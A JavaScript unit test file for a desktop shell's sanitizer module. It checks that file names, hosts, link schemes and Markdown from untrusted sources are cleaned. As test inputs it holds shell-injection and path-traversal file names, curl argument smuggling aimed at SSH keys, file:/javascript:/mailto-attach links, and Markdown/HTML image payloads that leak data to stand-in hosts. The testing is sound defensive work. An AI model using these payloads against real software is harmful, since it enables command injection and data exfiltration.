// caelestia4: unit tests of modules/common/functions/untrusted.js, run by run.py with node (offline).
//   node tools/tests/untrusted-text/untrusted.test.js <path to untrusted.js>
"use strict";
const fs = require("fs");
const vm = require("vm");

const src = fs.readFileSync(process.argv[2], "utf8").replace(/^\.pragma library\s*$/m, "");
const U = {};
vm.createContext(U);
vm.runInContext(src, U);

let failed = 0;
function check(ok, what) {
    console.log(`  ${ok ? "ok  " : "FAIL"} ${what}`);
    if (!ok) failed++;
}
const safeName = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;

// File names from a booru's file_url
for (const url of [
    "https://cdn.example/img/x%27%3Bid%3E%2Ftmp%2Fp%3B%27.jpg",
    "https://api.example/x/..%2F..%2F..%2F..%2F.config%2Ffish%2Fconf.d%2Fevil.fish",
    "https://cdn.example/..%2F..%2F.bashrc",
    "https://cdn.example/%2e%2e%2fa.png",
    "https://cdn.example/%E0%A4%A.png",
    "https://t.alcy.cc/img/a';cd;touch${IFS}PWNED_booru;'.png",
    "https://cdn.example/$(id).png",
    "https://cdn.example/a%5C..%5Cb.png",
    "https://cdn.example/",
    "https://cdn.example/....",
    "-rf.png",
    "",
]) {
    const name = U.safeFileName(url, "image");
    check(safeName.test(name) && !name.includes(".."), `safeFileName(${JSON.stringify(url)}) = ${JSON.stringify(name)}`);
}
check(U.safeFileName("https://cdn.donmai.us/original/ab/cd/abcd1234.jpg") === "abcd1234.jpg", "a plain name is kept");
check(U.safeFileName("https://w.example/full/wallhaven-1k2j3.png?x=1#y") === "wallhaven-1k2j3.png", "query and fragment are dropped");
check(U.safeFileName("https://a/x%27.jpg") !== U.safeFileName("https://a/x%22.jpg"), "two cleaned names stay apart");
check(U.safeFileName("https://a/x%27.jpg").endsWith(".jpg"), "a cleaned name keeps its extension");
check(U.safeFileName("https://a/" + "a".repeat(400) + ".png").length <= 140, "a long name is cut");

// Host names for favicons
for (const [input, want] of [
    ["example.com", "example.com"],
    ["Sub.Example-1.org", "sub.example-1.org"],
    ["$(id)", ""],
    ["x';touch P;'", ""],
    ["a.com;id", ""],
    ["a..com", ""],
    ["-a.com", ""],
    ["", ""],
]) check(U.hostName(input) === want, `hostName(${JSON.stringify(input)}) = ${JSON.stringify(want)}`);
for (const [input, want] of [
    ["https://www.example.com/path?q=1", "example.com"],
    ["https://user@host.example:8443/x", "host.example"],
    ["https://a.com?x='$(id)'", "a.com"],
    ["https://evil.example?$(cd;touch${IFS}PWNED_url)", "evil.example"],
    ["https://$(id)/x", ""],
    ["https://a'b.com/", ""],
    ["https://a.com;id/", ""],
    ["https://a/../b", "a"],
    ["example.org/page", "example.org"],
]) check(U.urlHost(input) === want, `urlHost(${JSON.stringify(input)}) = ${JSON.stringify(want)}`);

// Link schemes a click may open
for (const url of ["https://a", "http://example.com/x?y=1", "mailto:someone@example.com"])
    check(U.isWebUrl(url), `isWebUrl(${url})`);
for (const url of ["file:///etc/passwd", "javascript:alert(1)", "smb://x/share", "foo:bar", "https://", "https://a b",
    "https://a\nfile:///x", "//host/x", "", " https://a", "data:text/html,x", "MAILTO:/x",
    "mailto:a@b?attach=/etc/passwd", "mailto:a@b%3Fattach=/etc/passwd", "mailto:a@b&attachment=/x", "mailto:a@b#x"])
    check(!U.isWebUrl(url), `not isWebUrl(${JSON.stringify(url)})`);
// What a hover shows of a link: the URL a click opens, or nothing when a click opens nothing
check(U.linkPreview("https://phish.example/login") === "https://phish.example/login", "linkPreview shows the URL");
check(U.linkPreview("file:///etc/passwd") === "" && U.linkPreview("javascript:x") === "", "linkPreview: nothing for a link that won't open");
check(U.linkPreview("https://a.example/" + "x".repeat(300)).length === 160, "linkPreview shortens a long URL");
// The URLs a download may fetch
for (const url of ["https://cdn.example/a.jpg", "http://a/b?c=1"])
    check(U.isHttpUrl(url), `isHttpUrl(${url})`);
for (const url of ["mailto:a@b", "-K/home/u/.ssh/id_rsa", "-o/tmp/x", "file:///home/u/.ssh/id_rsa", "ftp://a/b", "", " https://a"])
    check(!U.isHttpUrl(url), `not isHttpUrl(${JSON.stringify(url)})`);

// StyledText escaping
check(U.escapeHtml(`<img src="http://127.0.0.1/s">&'`) === "&lt;img src=&quot;http://127.0.0.1/s&quot;&gt;&amp;&#39;", "escapeHtml");

// Markdown that loads nothing
for (const text of [
    "![x](http://127.0.0.1:1/p?leak=secret)",
    "hi ![x](https://evil.example/?d=summary) there",
    "![x][ref]\n\n[ref]: http://127.0.0.1:1/r",
    "<img src=http://127.0.0.1:1/s>",
    "< img src=http://127.0.0.1:1/s>",
    "<IMG SRC='http://127.0.0.1:1/s'/>",
    "\\<img src=http://127.0.0.1:1/s>",
    "<b>\\<img src=http://127.0.0.1:1/s></b>",
    "<b style=\"background-image:url(http://127.0.0.1:1/b)\">x</b>",
    "<table background=http://127.0.0.1:1/t><tr><td>x</td></tr></table>",
    "![a `x](/l) `](http://127.0.0.1:1/c)",
    "![![b](http://127.0.0.1:1/n)](/tmp/x.svg)",
    "![x](/tmp/a.svg \"t\")(http://e)",
    "![x](https\\://evil.example/a)",
    "![x](/tmp/a.svg) ![y](http://127.0.0.1:1/y)",
    "<!-- x --><?php ?><![CDATA[x]]>",
    "!![x](http://127.0.0.1:1/a)",
    "!!![x](http://127.0.0.1:1/b)",
    "\\!![x](http://127.0.0.1:1/c)",
    "![x](/dev/zero)",
    "![x](/tmp/../dev/zero)",
    "![x](/tmp/sub/abc.svg)",
    "![x](/tmp/abc.png)",
    "![x](/tmpx/abc.svg)",
]) {
    const out = U.markdownSafe(text, { localImageDir: "/tmp" });
    const images = (out.match(/!\[/g) ?? []).length;
    const local = (out.match(/!\[(?:[^\]`<\[]|\[[^\]]*\]\([^)]*\))*\]\(\/tmp\/[0-9a-f]+\.svg\)/g) ?? []).length;
    // Markdown takes HTML only where "<" is followed by a letter, "/", "!" or "?"
    check(images === local && !/<[A-Za-z\/!?]/.test(out.replace(/<https?:[^\s<>]*>/g, "")),
        `markdownSafe(${JSON.stringify(text)}) = ${JSON.stringify(out)}`);
    const notif = U.notificationMarkdown(text);
    const tags = notif.match(/<[^>]*>/g) ?? [];
    check(!/!\[/.test(notif) && tags.every(t => /^<\/?(a|b|i|u|br|em|strong|p)>$|^<a href="https?:[^"]*">$/.test(t)) && !/<\s+/.test(notif),
        `notificationMarkdown(${JSON.stringify(text)}) = ${JSON.stringify(notif)}`);
}
const latexDir = "/home/u/.cache/quickshell/media/latex";
check(U.markdownSafe("![latex](/home/u/.cache/quickshell/media/latex/0123abcd.svg)", { localImageDir: latexDir })
    === "![latex](/home/u/.cache/quickshell/media/latex/0123abcd.svg)", "a rendered LaTeX image stays");
check(U.markdownSafe("![latex](/home/u/.cache/quickshell/media/latex/0123abcd.svg)", { localImageDir: latexDir + "/" })
    === "![latex](/home/u/.cache/quickshell/media/latex/0123abcd.svg)", "a trailing / on the LaTeX folder is fine");
check(U.markdownSafe("![x](/home/u/.ssh/id_rsa.svg)", { localImageDir: latexDir }) === "[x](/home/u/.ssh/id_rsa.svg)",
    "a local image outside the LaTeX folder becomes a link");
check(U.markdownSafe("![latex](/home/u/x.svg)") === "[latex](/home/u/x.svg)", "without localImageDir every image becomes a link");
check(U.markdownSafe("!![x](http://127.0.0.1:1/a)") === "&#33;[x](http://127.0.0.1:1/a)", "a \"!\" before a removed image is an entity");
check(U.markdownSafe("**bold** `a < b` [link](https://a) <https://b> x<5") === "**bold** `a < b` [link](https://a) <https://b> x<5",
    "ordinary Markdown is unchanged");
check(U.markdownSafe("`Vec<T>` <script>") === "`Vec<T>` &lt;script>", "a tag is shown as text, code keeps its <");
for (const [input, want] of [
    ["`#include <stdio.h>` and ``std::vector<std::string>``", "`#include <stdio.h>` and ``std::vector<std::string>``"],
    ["`a < b` `<div>` </p>", "`a < b` `<div>` &lt;/p>"],
    // Code the parser is sure to read as code is copied as it is: Qt parses neither HTML nor images in it, and shows
    // an entity there as typed ("&lt;")
    ["`<img src=http://127.0.0.1:1/a>`", "`<img src=http://127.0.0.1:1/a>`"],
    ["Text with `<div class=\"a\">` code", "Text with `<div class=\"a\">` code"],
    ["`<style>` *{background:url(http://127.0.0.1:1/s)}", "`<style>` *{background:url(http://127.0.0.1:1/s)}"],
    ["Use `![alt](img.png)`", "Use `![alt](img.png)`"],
    ["`!![a](b)` and ![x](http://127.0.0.1:1/i)", "`!![a](b)` and [x](http://127.0.0.1:1/i)"],
    ["x\n\n    #include <stdio.h>\n    <div class=\"a\">![x](y)</div>\n\nz", "x\n\n    #include <stdio.h>\n    <div class=\"a\">![x](y)</div>\n\nz"],
    ["```\n<img src=\"http://127.0.0.1:1/f\">\n```", "```\n<img src=\"http://127.0.0.1:1/f\">\n```"],
    ["~~~js\nx = `<b class=a>`\n~~~\n<img src=x>", "~~~js\nx = `<b class=a>`\n~~~\n&lt;img src=x>"],
    ["`<img` src=http://127.0.0.1:1/a>`", "`<img` src=http://127.0.0.1:1/a>`"],
    ["\\`<img src=http://127.0.0.1:1/a>`", "\\`&lt;img src=http://127.0.0.1:1/a>`"],
    ["\\\\`<b>`", "\\\\`<b>`"],
    ["``<img src=http://127.0.0.1:1/a>`", "``&lt;img src=http://127.0.0.1:1/a>`"],
    ["`a\n\n<img src=http://127.0.0.1:1/a>`", "`a\n\n&lt;img src=http://127.0.0.1:1/a>`"],
    ["`a\nb` <img src=http://127.0.0.1:1/a> `", "`a\nb` &lt;img src=http://127.0.0.1:1/a> `"],
    // Where the parser may read it otherwise, code is hedged: images become links, tags with attributes are text
    // (a span over a line break, which a heading or an HTML block can end)
    ["`a\n# h ![i](http://127.0.0.1:1/h) `", "`a\n# h [i](http://127.0.0.1:1/h) `"],
    ["`a\n<div><img src=\"http://127.0.0.1:1/d\"></div> `", "`a\n<div>&lt;img src=\"http://127.0.0.1:1/d\"></div> `"],
    // a backtick in an autolink opens no span (the parser takes the autolink first)
    ["<1`x@e.example> <img src=\"http://127.0.0.1:1/e\"/> `", "<1`x@e.example> &lt;img src=\"http://127.0.0.1:1/e\"/> `"],
    // (one with a backtick isn't kept as a link here: escaped, the rest is then a code span, shown as text)
    ["<http://a`b> <img src=\"http://127.0.0.1:1/u\"/> `", "&lt;http://a`b> &lt;img src=\"http://127.0.0.1:1/u\"/> `"],
    // an indented block after a list or a quote may be part of it, not code
    ["- item\n\n    <img src=\"http://127.0.0.1:1/l\"/>", "- item\n\n    &lt;img src=\"http://127.0.0.1:1/l\"/>"],
    ["> q\n\n    <img src=\"http://127.0.0.1:1/q\"/>", "> q\n\n    &lt;img src=\"http://127.0.0.1:1/q\"/>"],
    // a fence closes at a fence with up to 3 spaces before it, as the parser closes it
    ["```\nx\n  ```\n<img src=\"http://127.0.0.1:1/c\"/>", "```\nx\n  ```\n&lt;img src=\"http://127.0.0.1:1/c\"/>"],
    // no backtick in a ``` fence's info string: that line is inline code, not a fence
    ["```x`y\n<img src=\"http://127.0.0.1:1/i\"/>\n```", "```x`y\n&lt;img src=\"http://127.0.0.1:1/i\"/>\n```"],
]) check(U.markdownSafe(input) === want, `markdownSafe(${JSON.stringify(input)}) = ${JSON.stringify(U.markdownSafe(input))}`);
check(U.notificationMarkdown("`<i>` <script>") === "`<i>` &lt;script>" && U.notificationMarkdown("`<img src=x>`") === "`<img src=x>`",
    "with tags allowed, code is copied as it is too");
// With tags allowed, a line that may open an HTML block (a tag alone on it, <p>...): in one the parser reads no
// Markdown, so a code span after it is raw HTML until the next blank line. Its code is escaped as the rest
for (const [input, want] of [
    ["<b>\n`<img src=\"http://127.0.0.1:1/b\"/>`\n</b>", "<b>\n`&lt;img src=\"http://127.0.0.1:1/b\"/>`\n</b>"],
    ["<p>x</p>\n`<img src=x/>`\n\n`<img src=y/>`", "<p>x</p>\n`&lt;img src=x/>`\n\n`<img src=y/>`"],
    ["x\n\n<b>\n```\n<img src=x/>\n```", "x\n\n<b>\n```\n&lt;img src=x/>\n```"],
]) check(U.notificationMarkdown(input) === want, `notificationMarkdown(${JSON.stringify(input)}) = ${JSON.stringify(U.notificationMarkdown(input))}`);
// The AI's formatting tags (MessageTextBlock): without attributes, <br> as <br/> (Qt reads the text after an
// unclosed tag as HTML, and lost it)
const aiTags = { allowTags: ["br", "b", "i", "u", "em", "strong", "sub", "sup", "tt", "code"] };
check(U.markdownSafe("| a | b<br>c |\nH<sub>2</sub>O <b onclick=x>b</b> <img src=x> `<i>q</i>`", aiTags)
    === "| a | b<br/>c |\nH<sub>2</sub>O <b>b</b> &lt;img src=x> `<i>q</i>`", "the AI's formatting tags render, others are text");
check(U.notificationMarkdown(`<b>Hi</b> <a href="https://a/?x=1&y=2" onclick="x">a</a> <a href="file:///etc/passwd">f</a><br/>`)
    === `<b>Hi</b> <a href="https://a/?x=1&amp;y=2">a</a> <a>f</a><br/>`, "a notification keeps its simple tags, no attributes but a web href");
check(U.notificationMarkdown("a < b") === "a &lt; b", "every other < in a notification is an entity");

if (failed) {
    console.log(`${failed} failed`);
    process.exit(1);
}
